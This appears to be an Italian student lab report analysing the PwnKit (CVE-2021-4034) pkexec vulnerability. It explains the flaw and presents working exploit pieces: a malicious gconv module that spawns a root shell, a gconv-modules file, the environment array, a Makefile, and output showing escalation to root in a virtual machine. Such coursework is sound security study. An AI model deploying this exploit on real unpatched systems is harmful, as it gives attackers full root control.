# Practica 3

@Alberto Bettini @Francesco Pizzato 

---

# 1. Introduzione

@Francesco Pizzato 

La vulnerabilità CVE-2021-4034, nota anche come PwnKit, è stata scoperta dal team di sicurezza di Qualys nel gennaio 2022. I ricercatori hanno pubblicato un rapporto dettagliato che evidenziava una grave falla di sicurezza nel file `pkexec`, componente del pacchetto software `polkit`. Questo pacchetto riveste un ruolo importante nei sistemi Linux, in quanto gestisce i permessi per l'esecuzione di azioni privilegiate in modo controllato e sicuro.

Questa vulnerabilità è rimasta nascosta e non rilevata per circa 12 anni, essendo presente in tutte le principali distribuzioni Linux come Ubuntu, Debian, Fedora, CentOS e molte altre minori fin dal 2009. Nonostante la sua lunga persistenza nei sistemi, non ci sono evidenze che suggeriscano un suo sfruttamento attivo prima della scoperta ufficiale nel 2022, quando sono state rapidamente rilasciate le necessarie patch di sicurezza.

Questa vulnerabilità permetteva di ottenere i permessi del superutente `root`che, di conseguenza, conferiva all'attaccante il controllo completo sul sistema compromesso. La gravità di questa vulnerabilità era amplificata dal fatto che poteva essere sfruttata localmente senza richiedere particolari privilegi iniziali, consentendo un'escalation di privilegi pressoché immediata su qualsiasi sistema Linux vulnerabile.

# 2. Analisi Vulnerabilità

@Francesco Pizzato 

La vulnerabilità CVE-2021-4034 deriva dalla gestione della memoria quando viene eseguito un programma. In memoria, gli argomenti e le variabili d'ambiente sono organizzati così:

| `argv[0]` | `argv[1]` |  | `env[0]` | `env[1]` | `env[…]` |
| --- | --- | --- | --- | --- | --- |
| Nome programma | Argomento 1 | `null` | Variabili d’ambiente | Variabili d’ambiente | … |

con null che separa gli argomenti del programma dalle variabili d’ambiente.

Il programma `pkexec.c` controlla gli argomenti a partire dall'indice 1, li legge e imposta il percorso (path) delle variabili. Successivamente recupera il percorso del programma e lo riassegna all'array degli argomenti iniziale. Un attaccante può impostare `argv[0]` a `null`, causando così una lettura fuori dai limiti (out of bounds read), poiché pkexec leggerebbe le variabili d'ambiente successive al separatore `null` anziché i legittimi argomenti del programma. Se il percorso delle variabili non inizia con '/', questo viene riscritto su `argv[n]`, generando una scrittura oltre i limiti (out of bounds write). 

```c
for (n = 1; n < (guint) argc; n++) {
    ...
}

...

path = g_strdup (argv[n]);

...

if (path[0] != '/')
{
    s = g_find_program_in_path (path);
    ...
    argv[n] = path = s;
}
```

Questa vulnerabilità consente di iniettare qualsiasi variabile d'ambiente in un processo. Il vantaggio è che possiamo iniettare variabili d'ambiente dannose (Unsecure Env Vars) e, grazie a queste, ottenere i privilegi dell'utente `root`. 

Tuttavia, esiste una complessità aggiuntiva: la funzione `clearenv()` viene chiamata subito dopo l'out of bounds write, eliminando ogni variabile d'ambiente. Questo ci obbliga a trovare un modo per eseguire il nostro codice malevolo dopo l'out of bounds write ma prima che `clearenv()` venga eseguita.

```c
if (path[0] != '/')
{
    s = g_find_program_in_path (path);
    ...
    argv[n] = path = s;
}

...

/* Find a solution here, in this code's segment */

...

if (clearenv () != 0)
{
    g_printerr ("Error clearing environment: %s\n", g_strerror (errno));
    goto out;
}
```

In nostro aiuto, proprio in quel segmento di codice, interviene la chiamata alla funzione `validate_environment_variable()`, al cui interno viene invocata `g_printerr()`. 

```c
if (!validate_environment_variable (key, value))	
```

Quest'ultima funzione è fondamentale per il nostro attacco: essa stampa l'errore direttamente se il messaggio è in formato UTF-8, ma se non lo è, tenta di convertirlo in UTF-8 utilizzando la funzione `iconv_open()`. Grazie a questa funzione di conversione, possiamo sfruttare i moduli di conversione (conversion modules) che vengono caricati dinamicamente durante l'esecuzione.

Manipolando variabili d'ambiente come `GCONV_PATH`, possiamo includere codice malevolo nei moduli di conversione che verranno eseguiti durante il processo di conversione. La cosa più importante, inoltre, è che questo codice sarà eseguito con i permessi di `root`.

# 3.Preparazione dell’Ambiente

@Alberto Bettini 

Per testare questa vulnerabilità in modo sicuro, ho configurato un ambiente virtualizzato utilizzando VirtualBox con le seguenti caratteristiche:

- Sistema operativo: **[Ubuntu 20.04 LTS](https://old-releases.ubuntu.com/releases/20.04.0/)** (versione precedente al patch)
- Configurazione: Installazione standard con polkit predefinito
- Utenti: Creato un utente non privilegiato "user"

Ho verificato la presenza del binario pkexec e dei suoi permessi:

```bash
$ ls -la /usr/bin/pkexec:
-rwsr-xr-x 1 root root 31032 gen 13 2021 /usr/bin/pkexec
```

# 4. Sviluppo Exploit

@Alberto Bettini 

Per sfruttare la vulnerabilità CVE-2021-4034 (PwnKit), ho seguito il metodo descritto da PwnFunction su GitHub. L’idea è “ingannare” `pkexec` facendogli caricare una libreria creata da noi, che viene eseguita con i privilegi di root.

## 4.1 Struttura del exploit

l’exploit è formati da  **tre elementi:** 

1. **Una libreria malevola** (`evil-so.c`) che contiene il nostro codice da eseguire come root.
2. **Un file di configurazione** (`gconv-modules`) che dice al sistema come usare quella libreria.
3. **Uno script o programma (`exploit.c`)** che crea le cartelle e le variabili d’ambiente richieste, poi lancia `pkexec`.

### `evil-so.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);         // Imposta l'utente a root
    setgid(0);         // Imposta il gruppo a root
    setgroups(0);      // Rimuove eventuali altri gruppi
    execve("/bin/sh", NULL, NULL);  // Apre una shell
}
```

Questa funzione `gconv_init()` viene chiamata automaticamente dal sistema quando `pkexec` prova a caricare un modulo di conversione caratteri, come vedremo più avanti.

### `gconv-modules`

Questo è un semplice file di testo che spiega al sistema dove si trova il nostro modulo finto (`evil.so`).

```
module  INTERNAL  BRUH//  evil   2
```

Questa riga serve a collegare il nome “finto” del tipo di caratteri (`CHARSET=BRUH`) alla libreria `evil.so`.

### `exploit.c`

Questo programma (o script) crea le cartelle e i file necessari, copia tutto al posto giusto, e poi lancia `pkexec` con alcune variabili d’ambiente modificate:

```c
char *envp[] = {
    "evildir",       // nome della cartella dei moduli
    "GCONV_PATH=.",  // dice al sistema di cercare moduli nella cartella corrente
    "SHELL=BRUH",    // richiesto da pkexec, inganna il controllo
    "CHARSET=BRUH",  // charset finto che attiva il nostro modulo
    NULL
};
```

Il programma poi esegue `pkexec`, e il sistema, tentando di stampare un errore in "ryaagard", cerca un modulo di conversione in `GCONV_PATH=.` e trova proprio la nostra libreria `evil.so`. A quel punto, la esegue **come root**, e noi otteniamo una shell root.

## 4.3 Compilazione e Esecuzione Exploit

Per compilare tutti i file necessari, utilizziamo il framework `Make`, che ci permette di automatizzare il processo di compilazione tramite un file chiamato `Makefile`. Questo file contiene le istruzioni su come compilare ciascun file sorgente.

```makefile
all:
	gcc -shared -o evil.so -fPIC evil-so.c
	gcc exploit.c -o exploit

clean:
	rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so
```

### Compilazione

```bash
make all
```

### Esecuzione

```bash
user@user:~$ 
user@user:~$ 
user@user:~$ id
uid=1000(miley) gid=1000(miley) groups=1000(miley)
user@user:~$ ./exploit
#
id
uid=0(root) gid=0(root) groups=0(root)
#
```